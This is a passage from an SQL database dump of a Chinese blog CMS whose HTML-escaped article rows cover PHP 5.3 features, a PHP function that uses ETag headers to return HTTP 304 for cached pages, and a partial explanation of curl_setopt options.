PHP V5 中得到显著的改善，并且后续版本还会调整。现在，PHP V5.3 提供了一些令人兴奋的改进，包括语法增强，例如新 __callStatic() 魔术方法、动态的静态调用、延迟静态绑定、静态方法和成员支持。它为 SPL 添加了新的内容，包括双重链接表、栈、堆和队列的实现，使您获得了一些常见的数据结构并且可以轻松使用它们。最后，期待已久的循环垃圾收集器是一个经过改进的垃圾收集器，它恰当地为这些循环实例释放内存，解决了自引用类的内存和性能问题。所有这些特性使 PHP V5.3 成为一种更加强大的面向对象编程语言。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;4.用PHP控制用户浏览器缓存！&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;原文地址: http://www.longbill.cn/blog/index.php?id=56&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;你写的php程序是否高效？你是否会担心自己的程序太庞杂，执行速度很慢？你是否用过php动态生成图片？&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; 其实每种浏览器都有缓存策略，会暂时将每一个浏览过的文件缓存在一个特殊的文件夹里。我们就可以在用户重复提交页面请求的时候，告诉用户这个页面没有改变，可以调用缓存。 那我们怎么知道用户有没有这个页面的缓存数据呢？ 其实浏览器在发送请求的时候会先发送http头，一般象这样：&lt;/div&gt;\r\n&lt;div&gt;Date: Sun, 30 Jul 2006 09:18:11 GMT&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;Content-Type: image/gif&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;Last-Modified: Wed, 19 Jul 2006 07:40:06 GMT&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ETag: &quot;8c55da8d6abc61:2327&quot;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;Content-Length: 14757&lt;/div&gt;\r\n&lt;div&gt;其中Last-Modified: Wed, 19 Jul 2006 07:40:06 GMT&lt;/div&gt;\r\n&lt;div&gt;ETag: &quot;8c55da8d6abc61:2327&quot;就是有关页面的缓存信息的。然后如果服务器返回的响应代码不是HTTP 200 (OK)，而是 304的话，浏览器就会从缓存中读取数据。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;根据这个原理，我写了一个函数，这个函数可以用在不经常更新或者需要经常刷新的页面，可以大大减轻服务器的负担，因为它如果发现客户端有缓存，就向客户端发送一个304响应，然后停止程序的执行。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;演示地址：http://www.longbill.cn/down/sample/etag.php&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;cache();&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo date(&quot;Y-m-d H:i:s&quot;); &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;function cache()&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{//author:Longbill ( www.longbill.cn )&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;$etag = &quot;eeee&quot;; &amp;nbsp;//标记字符串，可以任意修改&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;if ($_SERVER[''HTTP_IF_NONE_MATCH''] == $etag)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;header(''Etag:''.$etag,true,304);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;exit;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;else header(''Etag:''.$etag);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302788888, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(56, 1, 'php curl_setopt函数相关应用及介绍', '', '', '&lt;p style=&quot;margin:0cm;margin-bottom:.0001pt;line-height:15.75pt;&quot;&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl_setopt&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;函数相关应用及介绍&lt;/span&gt;&lt;/strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;o :p=&quot;&quot;&gt;&lt;/o&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin:0cm;margin-bottom:.0001pt;line-height:15.75pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;一、要想使用&lt;/span&gt;&lt;span class=&quot;ttag&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl_setopt&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个函数必须在服务器里边进行编译&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个组件，怎么安装编译这个组件请具体到&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;google&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;搜索&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;二、&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl_setopt&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;php&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;帮助文档的解释&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nbool curl_setopt (int ch, string option, mixed value)&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;　&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\ncurl_setopt()&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;函数将为一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURL&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;会话设置选项。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;option&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;参数是你想要的设置，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;value&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;是这个选项给定的值。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;下列选项的值将被作为长整形使用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;在&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;option&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;参数中指定&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;：&lt;/span&gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;　&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_INFILESIZE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;当你上传一个&lt;span class=&quot;ttag&quot;&gt;文件&lt;/span&gt;到远程站点，这个选项告诉&lt;/span&gt;&lt;span class=&quot;ttag&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;你上传文件的大小。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_VERBOSE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你想&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURL&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;报告每一件意外的事情，设置这个选项为一个非零值。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_HEADER: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你想把一个头包含在输出中，设置这个选项为一个非零值。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_NOPROGRESS: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你不会&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURL&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;传输显示一个进程条，设置这个选项为一个非零值。&lt;/span&gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;注意：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;自动设置这个选项为非零值，你应该仅仅为了调试的目的来改变这个选项。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_NOBODY: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你不想在输出中包含&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;body&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;部分，设置这个选项为一个非零值。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_FAILONERROR: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你想让&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;在发生错误&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;代码返回大于等于&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;300)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;时，不显示，设置这个选项为一人非零值。默认行为是返回一个正常页，忽略代码。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_UPLOAD: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你想让&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;为上传做准备，设置这个选项为一个非零值。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_POST: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;如果你想&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;去做一个正规的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP POST&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;，设置这个选项为一个非零值。这个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;POST&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;是普通的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; application/x-www-from-urlencoded&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;类型，多数被&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTML&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;表单使用。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_FTPLISTONLY: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置这个选项为非零值，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;将列出&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;FTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;的目录名列表。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_FTPAPPEND: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置这个选项为一个非零值，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;将&lt;span class=&quot;ttag&quot;&gt;应用&lt;/span&gt;远程文件代替覆盖它。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_NETRC: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置这个选项为一个非零值，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;将在你的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; ~./netrc &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;文件中查找你要建立连接的远程站点的用户名及密码。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_FOLLOWLOCATION: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置这个选项为一个非零值&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;象&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; ''Location: '')&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;的头，服务器会把它当做&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;头的一部分发送&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;注意这是递归的，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;将发送形如&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; ''Location: ''&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;的头&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_PUT: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置这个选项为一个非零值去用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;上传一个文件。要上传这个文件必须设置&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURLOPT_INFILE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURLOPT_INFILESIZE&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;选项&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;.&lt;br /&gt;\r\nCURLOPT_MUTE: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置这个选项为一个非零值，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;对于&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;CURL&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;函数将完全沉默。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_TIMEOUT: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;设置一个长整形数，作为最大延续多少秒。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_LOW_SPEED_LIMIT: &lt;/span&gt;&lt;span 